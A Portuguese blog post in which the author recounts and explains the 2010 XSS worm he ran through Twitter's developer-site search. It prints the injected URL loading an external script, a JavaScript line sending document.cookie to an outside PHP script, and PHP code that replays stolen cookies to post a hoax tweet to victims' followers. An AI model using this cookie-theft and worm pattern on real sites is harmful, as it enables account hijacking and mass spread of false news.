---
title: "Como mais de 350 mil pessoas caíram na falha do Twitter"
date: 2018-06-13
type: security
tags: [segurança, xss, javascript, twitter, php]
description: "Em 2010, com 16 anos, explorei uma falha de XSS no Twitter que me permitiu publicar tweets em mais de 350 mil contas sem saber nenhuma senha."
cover: /blog/_content/como-mais-de-350-mil-pessoas-cairam-na-falha-do-twitter/cover.jpeg
coverAlt: "Ilustração representando a falha de XSS no Twitter"
draft: false
---

Olá, seja bem vindo, pegue uma cadeira e venha ler sobre essa história que me deixou com bastante medo na época!

Era 2010, eu tinha 16 anos e já desenvolvia há 4 anos por diversão, participava ativamente de uma comunidade no orkut chamada Orkut Exploits (já falo mais sobre ela), lá conheci pessoas incríveis e muito inteligentes, foi lá que muita coisa em programação fez sentido pra mim. Hoje em dia existem muitas documentações em português e vídeos no YouTube para se aprender alguma linguagem de programação, mas 10 anos atrás as coisas eram bem diferentes.

Caso você não seja um desenvolvedor(a) e entrou neste artigo por curiosidade, pode ler até o final. Pois irei abordar conteúdo técnico, porém bem explicados de modo que qualquer um sendo desenvolvedor ou não, possa entender como isso foi possível ser feito.

Nessa época acabei conhecendo um site chamado [xssed.com](http://xssed.com), na época, ele era bem ativo e sempre que surgia novas falhas, eram divulgadas nele. Alguém na comunidade alertou sobre uma possível falha de XSS na busca do dev.twitter.com e lá fui eu explorar.

---

## Mas o que é uma falha de XSS?

Fique tranquilo, irei te explicar detalhadamente o que é isso.

Basicamente, uma falha de XSS é uma falha onde podemos inserir tags HTML de modo que a entrada que inputamos em um site faça parte do código dele.

Ainda não entendi….

Sem problemas, imagine que temos uma busca usando a seguinte URL:

```
http://meusite.com/buscar?q=meu+texto
```

Após realizar a busca, eu como desenvolvedor resolvo criar um campo escondido com o valor que foi buscado. Como eu faria isso?

```html
<input type="hidden" name="q" value="meu texto" />
```

Parece ser a solução né, para uma pessoa comum ou um desenvolvedor iniciante, realmente isso está perfeito, mas imagina se eu busco pelo seguinte texto: `"/><script>alert('xss')</script>`

Qual o comportamento desse código na minha página caso não exista tratamento?

```html
<input type="hidden" name="q" value=""/><script>alert('xss')</script>"/>
```

A parte em negrito é a parte que foi enviada na busca. Tá, mas e o resultado disso?

Ao acessar a página de busca com o nosso código na URL, exemplo:

```
http://meusite.com/buscar?q="/> <script>alert('xss')</script>
```

A página irá executar o meu código JavaScript e eu terei domínio sobre o browser/navegador de quem clicou em meu link.

![Demonstração do alert() de XSS no navegador](/blog/_content/como-mais-de-350-mil-pessoas-cairam-na-falha-do-twitter/xss-alert.png)

---

## Ainda sim estou confuso, o que isso tem a ver com o Twitter?

Dentro do subdomínio `dev.twitter.com` existia essa falha na busca de documentação para os desenvolvedores. Segue o link abaixo (não funciona mais):

```
http://dev.twitter.com/search?query=%253C/script%253E%253Cscript%20src=%27//dgoh-codes.com/joseph/twitter/lol.js%27%253E%253C/script%253E
```

O que isso pode ser feito?

Para quem está acostumado a trabalhar na web, sabe que qualquer autenticação é realizada pelo backend e a autorização é salva nos cookies do navegador dos usuários, por este motivo você não precisa sempre fazer login novamente para acessar outra página diferente da home no Facebook por exemplo. Pois o sistema detecta que você já possui o cookie autorizado e você se mantém logado no sistema.

Continuo sem entender…

Não se preocupe, depois desse tópico você irá entender o motivo dessa explicação acima! O Twitter não é diferente de qualquer outro sistema, ele guarda um cookie para dizer qual usuário está logado em qual navegador. Dessa forma tudo que eu precisava era capturar os cookies dos usuários e guardar eles em um banco de dados pessoal, sempre que eu precisasse acessar um perfil, eu mudaria os cookies do meu navegador, caso o cookie não tenha sido expirado, o Twitter identificará que eu sou outra pessoa, pois foi a mesma que recebeu essa autenticação. É como se eu roubasse um crachá de outra pessoa e me passasse por ela.

![Analogia do crachá roubado](/blog/_content/como-mais-de-350-mil-pessoas-cairam-na-falha-do-twitter/stolen-badge.jpeg)

Mas como eu pego esse cookie usando essa falha?

É simples, os cookies do navegador podem ser pegos usando `document.cookie`. Experimente entrar no console do seu navegador e digitar `document.cookie` — você irá visualizar todos os cookies do site que você está vendo atualmente, que salvou em seu navegador.

![document.cookie no console do navegador](/blog/_content/como-mais-de-350-mil-pessoas-cairam-na-falha-do-twitter/document-cookie.png)

Mas eu fui além disso, o Twitter tem uma segurança que o cookie caso não seja usado, ele expira em algumas horas, então não era vantagem pra mim ter o cookie de cada pessoa salvo, se em algumas horas tudo iria ficar inválido. Então eu tive uma ideia! Vou usar o cookie no momento que ele é pego, e vou publicar uma mensagem com o link da própria falha. Assim cada pessoa que clicava no link, automaticamente divulgava a mensagem com o link da falha encurtado para todos os seus seguidores, assim quem clicasse repetia o mesmo processo.

![Diagrama de propagação viral da falha](/blog/_content/como-mais-de-350-mil-pessoas-cairam-na-falha-do-twitter/viral-spread.png)

Para eu usar um cookie de um usuário, eu fiz o seguinte, criei um redirecionamento para um script escrito em PHP enviando o cookie em base64 pela URL, ficando dessa forma:

```javascript
window.location.href = "http://meusite.com/script.php?cookie=" + btoa(document.cookie);
```

Mas por que base64? Para um dado ser enviado pela URL ele deve sofrer um tratamento chamado URI Encoding, onde converte caracteres como `&` para `%26`.

Porém, base64 não possui caracteres fora do padrão do encoding, como o interrogação (`?`) e o `&`. Com isso a chance de dar certo era 100%.

O `window.location.href` redirecionava o usuário para o meu script. Então meu script recebia o cookie vindo da URL, publicava a mensagem e depois redirecionava para meu Twitter pessoal (@Joseph_Felix).

Como eu publicava essa mensagem com o cookie retornado?

Eu utilizava a biblioteca cURL do PHP enviando uma requisição POST para a página de publicação da mensagem, no cabeçalho da requisição eu enviava o meu texto, juntamente com o cookie passado por GET. Segue um exemplo abaixo:

```php
<?php

// Recebo o cookie passado pela URL através do XSS
$cookie = base64_decode($_GET['cookie']);

// Instancio a classe do curl através da função curl_init já para a URL de postagem do twitter
$ch = curl_init('http://twitter.com/post');

// Corpo da requisição com a mensagem que desejo twittar
$post = http_build_query([
    'tweet' => 'PeLanza da banda Restart sofre acidente trágico | http://bit.ly/d5Pho8'
]);

// Algumas configurações enviadas no cabeçalho da requisição
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true, // Ativa o retorno da transferência
    CURLOPT_COOKIE         => $cookie, // Cookie recebido
    CURLOPT_POST           => true, // Especifico que a requisição é POST
    CURLOPT_POSTFIELDS     => $post  // Dados enviados por POST
]);

curl_exec($ch); // Envia a requisição para o twitter

// Redireciona para meu twitter
header('Location: http://twitter.com/Joseph_Felix');
```

Código pequeno, não é mesmo? Pois bem, a falha é bem simples de ser explorada. Então a rota era:

1. Usuário visualizou o tweet com o link infectado
2. Usuário clicou no link infectado
3. Redireciona para o dev.twitter com meu script injetado na URL
4. O navegador dele executa meu script
5. Meu script redireciona para um outro script em PHP enviando o cookie pela URL
6. Meu script busca o cookie na URL e utiliza para publicar a mensagem do passo 1
7. O script redireciona para meu perfil

Os passos são bem simples de entender, mas na época nem os editores do G1 e do R7 entenderam como era possível publicar um tweet na conta dos outros sem ter a senha do Twitter dos mesmos. Pois bem, esta é minha explicação depois de 8 anos de como isso foi possível! Após este capítulo, o Twitter deletou minha conta mais de 11 vezes.

---

## Repercussão na mídia

Deixo aqui algumas matérias de jornais importantes que publicaram sobre isso na época:

- [Falsa morte de cantor da banda Restart se espalha por meio de vírus no Twitter — R7](http://noticias.r7.com/tecnologia-e-ciencia/noticias/falsa-morte-de-cantor-da-banda-restart-se-espalha-por-meio-de-virus-no-twitter-20100906.html)
- [Vírus ataca usuários brasileiros do Twitter — Estadão](https://link.estadao.com.br/noticias/geral,virus-ataca-usuarios-brasileiros-do-twitter,10000042753)
- [Falsa notícia sobre a banda Restart espalha vírus pelo Twitter — G1](http://g1.globo.com/tecnologia/noticia/2010/09/noticia-de-artista-acidentado-com-link-contamindo-e-espelhada-pelo-twitter.html)
- [Mensagem sobre integrante da Restart aciona vírus no Twitter — Terra](https://www.terra.com.br/noticias/tecnologia/internet/mensagem-sobre-integrante-da-restart-aciona-virus-no-twitter,7a7fd1f90a97a310VgnCLD200000bbcceb0aRCRD.html)

Sobre o que era a Orkut Exploits, vou deixar o G1 explicar para vocês :)

- [Falhas mostram despreparo de sites de redes sociais — G1](http://g1.globo.com/tecnologia/noticia/2010/09/falhas-mostram-despreparo-de-sites-de-redes-sociais.html)

Espero que tenham gostado do artigo, abraço e até mais :)
